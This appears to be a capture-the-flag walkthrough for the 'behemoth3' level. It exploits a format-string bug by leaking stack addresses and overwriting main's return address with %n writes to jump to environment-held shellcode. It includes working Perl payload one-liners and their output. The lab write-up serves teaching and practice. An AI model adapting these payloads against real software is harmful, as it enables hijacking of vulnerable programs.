@@ -1,0 +1,41 @@
+This level is pretty straightforward. A checked fgets call occurs, writing into a stack buffer. The program then prints this
+string with printf. Our objective will be to overwrite the return address of main with something malicious. The fgets makes
+this slightly tricky, since we only have 200 bytes of space to work with, but we can print out a lot of characters with %nx
+formatters, so we should have plenty of space to work with. We'll load some shellcode into an env addr and see if we can ret
+there.
+
+EVIL should be around 0xffffdd09, so our target addr will be 0xffffde09
+
+The first thing to do is going to be to determine the stack address where Main's return address is stored. It's returning to
+0xf7e2a286.
+
+Dumping the stack out with a shitload of `%p`s shows that the return address is stored 51 words down the stack from when
+the vulnerable printf occurs. The next step will be to inspect memory in GDB and find a value nearby that points at
+something else in the stack. If we can find a value that points at something in the stack, we can dump this value with %p
+and offset it, giving us the real return address location.
+
+In GDB, the return address is at 0xffffd6cc. The second word down is 0xffffd764. Supplying an argv to offset the stack
+shifts these to 0xffffd6ac 0xffffd744. The difference between this word and the location of the return address seems
+constant, at 0x98. So, if we leak this pointer and subtract 0x98 from it, the result should be the location of the return
+address in the stack.
+
+    behemoth3@behemoth:/behemoth$ perl -e 'print "%52\$p %53\$p %54\$p" . "\n"' | ./behemoth3
+    Identify yourself: Welcome, 0xf7e2a286 0x1 0xffffd554
+
+The return address should be at 0xffffd4bc. We can test it by writing a garbage value at this address and seeing if the
+program segfaults.
+
+    behemoth3@behemoth:/behemoth$ perl -e 'print "\xbc\xd4\xff\xff" . "%1\$n" . "\n"' | ./behemoth3
+    Identify yourself: Welcome, ����
+
+    aaaand goodbye again.
+    Segmentation fault
+
+We have our address, now we just need to overwrite it to about halfway through EVIl, 0xffffde09. Using GDB to check the
+result of our overwrite, we manage to overwrite the return address to 0xffffde09 with
+
+    perl -e 'print "\x8c\xd4\xff\xff" . "\x8d\xd4\xff\xff" . "\x8e\xd4\xff\xff" . "\x8f\xd4\xff\xff" . "%0249x" . "%1\$n" . "%0213x" . "%2\$n" . "%033x" . "%3\$n" . "%4\$n" . "\n"'
+
+Swapping in the real location of the return address successfully pwns this bin.
+
+    perl -e 'print "\xbc\xd4\xff\xff" . "\xbd\xd4\xff\xff" . "\xbe\xd4\xff\xff" . "\xbf\xd4\xff\xff" . "%0249x" . "%1\$n" . "%0213x" . "%2\$n" . "%033x" . "%3\$n" . "%4\$n" . "\n"'
